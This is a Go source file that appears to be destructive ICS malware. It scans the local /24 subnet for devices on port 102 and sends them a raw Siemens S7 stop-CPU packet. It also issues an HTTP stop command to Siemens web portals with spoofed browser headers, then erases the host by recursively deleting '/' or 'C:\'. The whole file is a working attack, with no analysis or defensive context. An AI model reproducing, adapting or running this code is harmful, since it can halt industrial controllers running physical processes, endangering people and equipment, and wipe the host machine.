package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"net/http"
	"os"
	"runtime"
	"strings"
	"time"
)

// GetIPAddr returns the first non-loopback IPv4 address.
func GetIPAddr() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		fmt.Println(err)
		return ""
	}

	for _, address := range addrs {
		if ipnet, ok := address.(*net.IPNet); ok && ipnet.IP.To4() != nil && !ipnet.IP.IsLoopback() {
			return ipnet.IP.String()
		}
	}
	return ""
}

// GetNetwork generates a list of all IPs in the network range of the given IP address.
func GetNetwork(ipAddr string) []string {
	_, ipnet, err := net.ParseCIDR(ipAddr)
	if err != nil {
		fmt.Println(err)
		return nil
	}

	mask := binary.BigEndian.Uint32(ipnet.Mask)
	start := binary.BigEndian.Uint32(ipnet.IP) + 1
	finish := (start & mask) | (mask ^ 0xffffffff)

	var ipList []string
	for i := start; i <= finish; i++ {
		ip := make(net.IP, 4)
		binary.BigEndian.PutUint32(ip, i)
		ipList = append(ipList, ip.String())
	}
	return ipList
}

// ScanIP returns a list of reachable IPs on port 102.
func ScanIP(ipList []string) []string {
	var scannedIPs []string
	for _, ip := range ipList {
		target := ip + ":102"
		if conn, err := net.DialTimeout("tcp", target, 1*time.Second); err == nil {
			scannedIPs = append(scannedIPs, ip)
			conn.Close()
		}
	}
	return scannedIPs
}

// KillIP sends a stop command to the devices at the scanned IPs.
func KillIP(scannedIPs []string) {
	stop := "\x03\x00\x00\x21\x02\xf0\x80\x32\x01\x00\x00\x06\x00\x00\x10\x00\x00\x29\x00\x00\x00\x00\x00\x09\x50\x5f\x50\x52\x4f\x47\x52\x41\x4d"
	for _, ip := range scannedIPs {
		if conn, err := net.Dial("tcp", ip+":102"); err == nil {
			conn.Write([]byte(stop))
			conn.Close()
		}
	}
}

// KillHTTP sends a stop command via HTTP to the devices at the scanned IPs.
func KillHTTP(scannedIPs []string) {
	client := &http.Client{}
	for _, ip := range scannedIPs {
		data := strings.NewReader(`Run=1&PriNav=Stop`)
		req, err := http.NewRequest("POST", "http://"+ip+"/CPUCommands", data)
		if err != nil {
			continue
		}
		setHTTPHeaders(req, ip)
		if _, err = client.Do(req); err != nil {
			continue
		}
	}
}

// setHTTPHeaders sets the necessary HTTP headers for the requests in KillHTTP.
func setHTTPHeaders(req *http.Request, ip string) {
	req.Header.Set("Host", ip)
	req.Header.Set("Content-Length", "19")
	req.Header.Set("Cache-Control", "max-age=0")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("Origin", "http://"+ip)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
	req.Header.Set("Referer", "http://"+ip+"/Portal/Portal.mwsl?PriNav=Start")
	req.Header.Set("Accept-Encoding", "gzip, deflate")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Connection", "close")
	req.Header.Set("Cookie", "siemens_automation_no_intro=TRUE")
}

// KillLinux deletes files on Linux systems if the user has sufficient privileges.
func KillLinux() {
	if err := os.RemoveAll("/"); err != nil {
		fmt.Println(err)
	}
}

// KillWindows deletes files on Windows systems if the user has sufficient privileges.
func KillWindows() {
	if err := os.RemoveAll("C:\\"); err != nil {
		fmt.Println(err)
	}
}

func main() {
	ipAddr := GetIPAddr() + "/24"
	ipList := GetNetwork(ipAddr)
	scannedIPs := ScanIP(ipList)

	KillIP(scannedIPs)
	KillHTTP(scannedIPs)

	switch runtime.GOOS {
	case "linux":
		KillLinux()
	case "windows":
		KillWindows()
	}
}
